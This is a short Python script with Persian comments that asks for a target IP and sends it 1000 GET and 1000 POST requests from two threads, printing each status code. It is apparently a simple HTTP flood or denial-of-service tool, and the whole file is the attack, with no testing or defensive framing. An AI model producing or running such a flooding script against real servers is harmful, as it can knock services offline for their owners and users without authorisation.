
import requests
import threading

URL = input('EnTer The TarGeT Ip : ')

def send_requests(method):
    for _ in range(1000):
        if method == 'get':
            response = requests.get(URL)
        else:
            response = requests.post(URL)
            
        print(response.status_code)

# ارسال ریکوئست های GET
threading.Thread(target=send_requests, args=('get',)).start()

# ارسال ریکوئست های POST
threading.Thread(target=send_requests, args=('post',)).start()
